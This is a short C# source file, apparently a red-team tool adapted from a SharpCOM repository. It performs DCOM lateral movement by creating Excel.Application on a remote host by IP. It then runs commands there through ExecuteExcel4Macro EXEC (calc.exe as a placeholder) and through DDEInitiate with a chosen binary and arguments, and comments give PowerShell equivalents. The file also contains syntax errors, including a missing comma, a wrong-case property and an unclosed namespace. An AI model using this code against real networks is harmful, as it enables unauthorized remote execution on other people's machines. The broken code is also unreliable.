using System;
using System.Linq;
using System.Reflection;
using System.Collections.Generic;
using System.Text;
using System.Management;

namespace Dcom
{
	class program 
	{
		static void Main(string[] args)
		{
			ExcelDDE("putIPhere");
			ExcelDDE2("put","args","here");
		}

		static void ExcelDDE(string IP)
		{
			try
			{
				Type ComType = Type.GetTypeFromProgID("Excel.Application", IP); // (PS: $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application")))
				object excel = Activator.CreateInstance(ComType);

				excel.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, excel, new object[] { "EXEC(\\"calc.exe\\")" }); 
			}

			catch (Exception e)
			{
				Console.WriteLine("Error: {0}" e.message);
			}
			
		}

		static void ExcelDDE2(string target, string binary, string arg) 
		{
		    try // from https://github.com/rvrsh3ll/SharpCOM 
		    {
		        
		        var type = Type.GetTypeFromProgID("Excel.Application", target); // PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
		        var obj = Activator.CreateInstance(type);
		       
		        obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });  // PS> $excel.DisplayAlerts =$false
		        
		        obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj, new object[] { binary, arg }); // PS> $excel.DDEInitiate($binary, $args)
		    }
        
		    catch (Exception e)
		    {
		        Console.WriteLine(" Error: {0}", e.Message);
		    }
		}
}
